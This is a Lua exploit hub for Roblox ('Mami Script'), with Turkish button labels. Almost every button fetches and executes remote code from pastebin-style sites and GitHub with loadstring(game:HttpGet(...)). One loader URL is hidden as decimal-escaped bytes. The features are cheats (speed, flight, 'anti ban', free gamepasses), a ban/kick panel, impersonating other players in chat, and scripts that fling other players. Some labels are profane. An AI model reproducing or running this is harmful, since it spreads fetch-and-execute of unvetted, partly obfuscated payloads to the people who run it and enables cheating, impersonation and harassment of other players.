local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Mami Script", "Ocean")
    
    
    local Mami = Window:NewTab("Mami")
    local MamiSection = Mami:NewSection("Mami")
    
    MamiSection:NewButton("Mamiye abone olun leyn", ".", function()
    end)
    MamiSection:NewButton("Kanal KatilMami", ".", function()
    end)
    MamiSection:NewButton("abone olmayani sikerim", ".", function()
    end)
    MamiSection:NewButton("Yunus kraldir gerisi yalandir", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MamiSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    
    
    
    
    
    
    local Main = Window:NewTab("Scriptler")
    local MainSection = Main:NewSection("Scriptler")

    MainSection:NewButton("ucma", "ucurma", function()
        loadstring(game:HttpGet('https://pastebinp.com/raw/YSL3xKYU'))()
    end)
    MainSection:NewButton("Klavye", "Klavye", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
    end)
    MainSection:NewButton("fps boost", "fps boost", function()
        loadstring(game:HttpGet('https://pastebinp.com/raw/zJztwUg1'))()
        setfpscap(10000)
    end)
    MainSection:NewButton("Fps Booster V2", "Fps Boost", function()
        loadstring(game:HttpGet("https://pastebinp.com/raw/GSWA1L6y"))()
    end)
    MainSection:NewButton("Anti Ban", "Anti kick and Ban", function()
        loadstring(game:HttpGet("https://pastebinp.com/raw/Wqxzdi1q"))()
    end)
    MainSection:NewButton("Bedava Gamepass", "Amina koyim her seyi bedavag", function()
        loadstring(game:HttpGet('https://pastebinp.com/raw/QtQ4YnVR'))()
    end)
    MainSection:NewButton("Fps Limit Bypass", "Fps 10000", function()
        setfpscap(10000)
    end)
    MainSection:NewButton("Rtx", "Rtx", function()
        getgenv().RTX_Name = "Midday lite" 
        loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
    end)
    MainSection:NewButton("BedavaHeadless vb.", "headless korblox", function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/carlcoded/carlispro/main/carlhub'))()
    end)
    MainSection:NewButton("Avatar cal", "avatar", function()
        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\110\118\111\111\107\101\114\49\49\47\79\117\116\102\105\116\47\109\97\105\110\47\79\117\116\102\105\116\67\111\112\105\101\114\46\108\117\97\34\44\32\116\114\117\101\41\41\40\41\10")()
    end)
    
    MainSection:NewToggle("Super adam", "go fast and jump high", function(state)
        if state then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
        else
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
        end
    end)

    MainSection:NewButton("Admin komutlari", "FE Admin Commands", function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
    end)
    MainSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    MainSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)


    
    local Player = Window:NewTab("Oyuncu")
    local PlayerSection = Player:NewSection("Oyuncu")

    PlayerSection:NewToggle("Hiz", "go fast and jump high", function(state)
        if state then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 500
        else
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 500
        end
    end)
    
    PlayerSection:NewToggle("Ziplama", "go fast and jump high", function(state)
        if state then
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 350
        else
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = 350
        end
    end)

    PlayerSection:NewButton("Sifirla", "Resets to all defaults", function()
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
    end)
    PlayerSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    PlayerSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)


    
    local Other = Window:NewTab("Diger")
    local OtherSection = Other:NewSection("Diger")

    OtherSection:NewButton("Sohbet Sahtekarligi", "Lets you chat for other people", function()
        loadstring(game:HttpGet(('https://pastebinp.com/raw/djBfk8Li'),true))()
    end)

    OtherSection:NewButton("Bypass ucma", "bird mode", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/BypassedFly.lua"))() 

        Fly(true)
    end)
    OtherSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    OtherSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    
    
    
    local Mami2 = Window:NewTab("Esyalar")
    local Mami2Section = Mami2:NewSection("Esyalar")

    Mami2Section:NewButton("Kiliclar", "Kiliclar", function()
        loadstring(game:HttpGet("https://pastebinp.com/raw/AZVi2tuK"))()
    end)
    Mami2Section:NewButton("Oyun duzenleme itemi", "items", function()
        loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
    end)
    Mami2Section:NewButton("Kurucu itemi", "items", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Katilmami/Mamiscriptt1019199/main/mami.lua"))()
    end)
    Mami2Section:NewButton("1000 tane item", "items", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/PlanetHubX/Lucky-Blocks/main/source", true))()
    end)
    Mami2Section:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    Mami2Section:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    
    local Admin = Window:NewTab("Admin")
    local AdminSection = Admin:NewSection("Admin")
    
    AdminSection:NewButton("Kurucu itemi", "items", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Katilmami/Mamiscriptt1019199/main/mami.lua"))()
    end)
    
    AdminSection:NewButton("Ban kick paneli", "ban", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/harked", true))()
    end)
    
    AdminSection:NewButton("Admin komutlari", "FE Admin Commands", function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
    end)
    AdminSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    AdminSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    
    local Oyunlar = Window:NewTab("Oyunlar")
    local OyunlarSection = Oyunlar:NewSection("Oyunlar")
    
    OyunlarSection:NewButton("Bedava Brookhaven Premium", "Amina koyim her seyi bedavag", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/AvatarUnlocker/main/IceHub"))()
    end)
    OyunlarSection:NewButton("Katil vs Serif Key NiceMurderers4211Roblox", "Katil vs Serif script", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Duels214/main/Sheriffs1"))()
    end)
    OyunlarSection:NewButton("Lumber tycoon 2", "luaware", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/frencaliber/LuaWareLoader.lw/main/luawareloader.wtf",true))()
    end)
    OyunlarSection:NewButton("Doors script", "Doors", function()
        loadstring(game:HttpGetAsync("https://pastebinp.com/raw/R8QMbhzv"))()
    end)
    OyunlarSection:NewButton("Blox fruit", "Bloxfruit", function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tulam2000/FTS-HUB/main/FTS%20x%20Hub')))()
    end)
    OyunlarSection:NewButton("Build a boat", ".", function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/Build-A-Boat'))()
    end)
    OyunlarSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    OyunlarSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    
    
    local Troll = Window:NewTab("Troll")
    local TrollSection = Troll:NewSection("Troll")
    
    TrollSection:NewButton("Tikladigin kisiyi firlat", "ucurma", function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
    end)
    
    TrollSection:NewButton("ismi girileni firlat", "ucurma", function()
        loadstring(game:HttpGet('https://pastebinp.com/raw/fj5VwQtC'))()
    end)
    TrollSection:NewButton("Troll Script", "Troll", function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    end)
    TrollSection:NewButton("Admin Troll", "FE Admin Commands", function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
    end)
    TrollSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    TrollSection:NewButton("MAMİ SCRİPT SUNAR", ".", function()
    end)
    
    